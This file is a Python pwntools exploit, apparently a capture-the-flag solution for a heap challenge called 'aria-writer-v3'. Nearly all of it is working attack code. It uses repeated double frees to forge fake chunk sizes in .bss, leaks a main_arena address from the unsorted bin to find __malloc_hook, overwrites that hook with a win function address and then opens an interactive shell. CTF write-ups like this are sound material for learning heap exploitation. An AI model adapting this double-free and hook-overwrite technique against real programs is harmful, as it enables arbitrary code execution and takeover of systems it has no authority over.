from pwn import*
p = process('./aria-writer-v3')

### gadget
free_got = 0x601F90
free_plt = 0x400700
win_addr = 0x4008A7
bss_name = 0x602048
fake_addr = 0x602660
curr = 0x602040

### def
def write(size,comment):
    p.sendafter('Gimme int pls > ','1')
    p.sendafter('Gimme int pls > ',str(size))
    p.sendafter('what should i write tho > ',str(comment))
def delete():
    p.sendafter('Gimme int pls > ','2')

# input name
pay = ''
pay += 'Myname'
p.sendlineafter('whats your name > ',pay)

### leak

# DFB for leak
write(0x30, 'a'*8)
delete()
delete()
## DFB for exploit
write(0x10, 'z'*8)
delete()
delete()

# fake size(1)
write(0x20,'b'*8)
delete()
delete()
delete()
write(0x20, p64(fake_addr-0x10))   
write(0x20, 'b'*8)
write(0x20, p64(0)+p64(0x21))   
# fake size(2)
write(0x20,'c'*8)
delete()
delete()
delete()
write(0x20, p64(fake_addr+0x10))   
write(0x20, 'c'*8)
write(0x20, p64(0)+p64(0x21))

# put fake size on name
write(0x60,'d'*8)
delete()
delete()
delete()
write(0x60, p64(bss_name+0x18)) 
write(0x60, 'd'*8)
write(0x60, p64(0)+p64(0x601))   

# fake chunck free
write(0x50,'e'*8)
delete()
delete()
delete()
write(0x50,p64(curr))
write(0x50,'e'*8)
write(0x50,p64(0x602060)+p64(0)*2+p64(0x601))
delete()                        # <- unsorted bin main_arena+88 write on bss
# fill in NULL
write(0x30, p64(0x602048))
write(0x30, 'a'*8)
write(0x30, 'a'*24)

# get main_arena+88
p.recvuntil('a'*24)
main_arena = u64(p.recv(6).ljust(8,'\x00'))
malloc_hook = main_arena-112
print hex(main_arena)
print hex(malloc_hook)

# cover malloc_hook on win_func
write(0x10,p64(malloc_hook))
write(0x10,'z'*8)
write(0x10,p64(0x4008a7)+p64(0x4008a7))

# get sh
p.send('1')
p.send('8')             # <- end
p.interactive()




